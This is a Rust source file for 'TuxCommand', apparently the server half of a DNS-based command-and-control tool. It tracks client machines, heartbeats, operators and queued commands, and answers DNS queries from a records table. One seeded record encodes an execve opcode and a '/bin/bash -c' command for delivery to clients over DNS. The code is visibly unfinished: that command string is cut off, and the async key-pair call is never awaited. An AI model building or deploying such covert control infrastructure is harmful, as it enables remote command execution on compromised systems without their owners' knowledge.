use rusqlite::Connection;
use serde::Deserialize;
use std::process::exit;
use std::io;
use std::os::unix::prelude::PermissionsExt;
use std::path::Path;
use tokio::fs::{self, OpenOptions};
use tokio::io::AsyncReadExt;
use toml;
use users::get_current_uid;
use x25519_dalek::{PublicKey, SharedSecret, StaticSecret};

use hickory_proto::op::Message;
use hickory_proto::rr::RecordType::TXT;
use hickory_proto::rr::{RData, Record, RecordType};
use std::collections::HashMap;
use std::net::{Ipv4Addr, SocketAddr};
use std::str::FromStr;
use std::sync::Arc;
use tokio::net::UdpSocket;
use tokio::sync::Mutex;
use log::{error, debug, info};
use simple_logger;

/// Config file
const DATA: &str = "/etc/tuxcommand";

/// Codes
const EXIT: u8 = 0x01;
const EXECVE: u8 = 0x02;

const SPLASH: &str = r"  ______           ______                                          __
 /_  __/_  ___  __/ ____/___  ____ ___  ____ ___  ____ _____  ____/ /
  / / / / / / |/_/ /   / __ \/ __ `__ \/ __ `__ \/ __ `/ __ \/ __  / 
 / / / /_/ />  </ /___/ /_/ / / / / / / / / / / / /_/ / / / / /_/ /  
/_/  \__,_/_/|_|\____/\____/_/ /_/ /_/_/ /_/ /_/\__,_/_/ /_/\__,_/   ";

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    simple_logger::init_with_env().unwrap();
    // simple_logger::init_with_level(log::Level::Info).unwrap();
    println!("{}", SPLASH); 
    
    let data = if let Ok(config) = std::env::var("TUXCMD_CONFIG") {
        config
    } else if get_current_uid() == 0 {
        DATA.to_string()
    } else {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        format!("{home}/.tuxcommand")
    };

    let data = Path::new(&data);
    if !data.exists() {
        fs::create_dir(data).await.unwrap();
    }

    let keypair = Keypair::master(data); // Keypairs will be removed, but I'll keep this here till, so I remember

    let conn = Arc::new(Mutex::new(init_db(data).await.unwrap()));
    let config: Config = {
        let config: Config = load_config(data).await.unwrap();
        let p: u16 = std::env::var("TUXCMD_PORT").unwrap_or_else(|_| config.port.to_string()).parse().unwrap();
        Config { domains: config.domains, port: p }
     };

    info!("Config directory: {}", data.display());
    info!("C2 domains: {:?}", config.domains);
    let socket: UdpSocket = match UdpSocket::bind(SocketAddr::from_str(format!("0.0.0.0:{}", config.port).as_str())?).await {
        Ok(socket) => {
            info!("Listening on 0.0.0.0:{}", config.port);
            socket
        }
        Err(e) => {
            match e.kind() {
                io::ErrorKind::AddrInUse => {
                    error!("Address 0.0.0.0:{} is already in use. Is another instance of TuxCommand or a DNS server running?", config.port);
                    exit(1)
                }
                io::ErrorKind::PermissionDenied => {
                    error!("Failed to bind on 0.0.0.0:{}. Do you have CAP_NET_BIND_SERVICE? (TIP: are you running as root?)", config.port);
                    exit(1)
                }
                _ => {
                    error!("An unexpected error occurred while binding to 0.0.0.0:{}", config.port);
                    error!("{}", e);
                    exit(1)
                }
            }
        }
    };

    // let socket =
    //     UdpSocket::bind(SocketAddr::from_str(format!("0.0.0.0:{}", port).as_str())?).await?;
    let cache = Arc::new(Mutex::new(
        load_from_db(conn.clone(), config.domains.clone()).await?,
    ));
    let cache_clone = cache.clone();
    let conn_clone = conn.clone();

    // Update loop
    // tokio::spawn(async move {
    //     loop {
    //         tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
    //         let records = load_from_db(conn_clone.clone()).await.unwrap_or_default();
    //         *cache_clone.lock().await = records;
    //     }
    // });

    // Request loop
    let mut buf = vec![0u8; 4096];
    loop {
        let (len, peer) = socket.recv_from(&mut buf).await?;
        debug!("Received request from {}", peer);

        let records = load_from_db(conn_clone.clone(), config.domains.clone())
            .await
            .unwrap_or_default();
        
        *cache_clone.lock().await = records;
        
        let cache_guard = cache.lock().await;
        let resp = build_response(&buf[..len], &*cache_guard, &peer)?;
        
        socket.send_to(&resp, &peer).await?;
    }
}

fn build_response(
    req: &[u8],
    cache: &HashMap<(String, RecordType), String>,
    peer: &SocketAddr,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let req_msg = Message::from_vec(req)?;
    let mut resp = Message::new();
    resp.set_id(req_msg.id());
    resp.set_message_type(hickory_proto::op::MessageType::Response);

    for q in req_msg.queries() {
        resp.add_query(q.clone());

        let mut name = q.name().to_utf8().to_lowercase();
        if name.ends_with('.') {
            name.pop();
        }
        if let Some(val) = cache.get(&(name, q.query_type())) {
            match q.query_type() {
                RecordType::A => {
                    let addr = val.parse::<Ipv4Addr>()?;
                    info!("Recieved A query for {} from {}", q.name().to_string().strip_suffix('.').unwrap_or(&q.name().to_string()), peer);
                    resp.add_answer(Record::from_rdata(
                        q.name().clone(),
                        300,
                        RData::A(hickory_proto::rr::rdata::A(addr)),
                    ));
                }
                RecordType::TXT => {
                    resp.add_answer(Record::from_rdata(
                        q.name().clone(),
                        300,
                        RData::TXT(hickory_proto::rr::rdata::TXT::new(vec![val.clone()])),
                    ));
                }
                _ => {
                    debug!("Someone ({}) sent a query with unimplemented type.", peer);
                }
            }
        }
    }
    Ok(resp.to_vec()?)
}

async fn load_from_db(
    conn: Arc<Mutex<Connection>>,
    domains: Vec<String>,
) -> Result<HashMap<(String, RecordType), String>, String> {
    tokio::task::spawn_blocking(move || {
        let conn = conn.blocking_lock();
        let mut records = HashMap::new();
        let mut stmt = conn
            .prepare("SELECT name, record_type, value FROM records")
            .map_err(|e| e.to_string())?;
        let rows = stmt
            .query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, u16>(1)?,
                    row.get::<_, String>(2)?,
                ))
            })
            .map_err(|e| e.to_string())?;

        for row_result in rows {
            let (name, record_type_int, value) = row_result.map_err(|e| e.to_string())?;
            let record_type = RecordType::from(record_type_int);
            for domain in domains.iter() {
                let key = if name.is_empty() {
                    domain.clone()
                } else {
                    name.clone() + "." + domain
                };
                records.insert((key, record_type), value.clone());
            }
        }

        Ok(records)
    })
    .await
    .map_err(|e| e.to_string())?
}

#[derive(Deserialize)]
struct Config {
    domains: Vec<String>,
    port: u16,
}

async fn load_config(path: &Path) -> Result<Config, Box<dyn std::error::Error>> {
    let mut file = OpenOptions::new()
        .read(true)
        .create(true)
        .write(true)
        .open(path.join("config.toml"))
        .await?;
    let mut contents = String::new();

    if file.read_to_string(&mut contents).await? == 0 {
        fs::write(path.join("config.toml"), "domains = []\nport = 53").await?;
    }

    file.read_to_string(&mut contents).await?;
    let config: Config = toml::from_str(&contents)?;

    Ok(config)
}

async fn init_db(path: &Path) -> rusqlite::Result<Connection, rusqlite::Error> {
    let conn = Connection::open(path.join("tuxmux.db"))?;
    fs::set_permissions(path.join("tuxmux.db"), PermissionsExt::from_mode(0o600))
        .await
        .unwrap();
    conn.execute_batch("PRAGMA foreign_keys = ON;")?;

    conn.execute_batch(
        "
        BEGIN;

        CREATE TABLE IF NOT EXISTS clients (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            name        TEXT,
            public_key  BLOB NOT NULL,
            private_key BLOB NOT NULL
        );

        CREATE TABLE IF NOT EXISTS status (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id INTEGER NOT NULL,
            heartbeat INTEGER NOT NULL,
            status    INTEGER NOT NULL DEFAULT 0,
            FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
        );

        CREATE TABLE IF NOT EXISTS commands (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id     INTEGER NOT NULL,
            session_id    TEXT    NOT NULL,
            status        TEXT    NOT NULL DEFAULT 'pending',
            command_queue TEXT    NOT NULL DEFAULT '[]',
            FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
        );

        CREATE TABLE IF NOT EXISTS operators (
            id                INTEGER PRIMARY KEY AUTOINCREMENT,
            auth_key          TEXT    NOT NULL UNIQUE,
            name              TEXT    NOT NULL,
            current_client_id INTEGER,
            FOREIGN KEY (current_client_id) REFERENCES clients(id) ON DELETE SET NULL
        );

        CREATE TABLE IF NOT EXISTS records (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            name        TEXT    NOT NULL,
            record_type INTEGER NOT NULL,
            value       TEXT    NOT NULL,
            client_id   INTEGER,
            FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE SET NULL
        );

        CREATE INDEX IF NOT EXISTS idx_status_client   ON status(client_id);
        CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id);
        CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
        CREATE INDEX IF NOT EXISTS idx_operators_key   ON operators(auth_key);
        COMMIT;
    ",
    )?;
    conn.execute(
        "INSERT INTO records (name, record_type, value) VALUES (?1, ?2, ?3)",
        ("", u16::from(RecordType::A), "127.0.0.1"),
    )?;
    conn.execute(
        "INSERT INTO records (name, record_type, value) VALUES (?1, ?2, ?3)",
        (
            "testing",
            u16::from(RecordType::A),
            format!("{EXECVE}/bin/bash -c '/bin/echo test > "),
        ),
    )?;
    Ok(conn)
}

struct Keypair {
    private: StaticSecret,
    public: PublicKey,
}

impl Keypair {
    fn generate() -> Self {
        let private = StaticSecret::random();
        let public = PublicKey::from(&private);
        Self { private, public }
    }
    async fn master(data: &Path) -> Self {
        // This is the master keypair
        // encrypts everything that the operator can access after a challenge
        let keypair = if fs::try_exists(data.join("private.key")).await.unwrap() {
            let bytes: [u8; 32] = fs::read(data.join("private.key"))
                .await
                .unwrap()
                .try_into()
                .unwrap();
            let private = StaticSecret::from(bytes);
            let public = PublicKey::from(&private);
            return Keypair { private, public };
        } else {
            let keypair = Self::generate();
            fs::write(data.join("private.key"), &keypair.private.to_bytes())
                .await
                .unwrap();
            fs::write(data.join("public.key"), &keypair.public.to_bytes())
                .await
                .unwrap();
            fs::set_permissions(data.join("private.key"), PermissionsExt::from_mode(0o600))
                .await
                .unwrap();
            fs::set_permissions(data.join("public.key"), PermissionsExt::from_mode(0o600))
                .await
                .unwrap();
            return keypair;
        };
    }
}
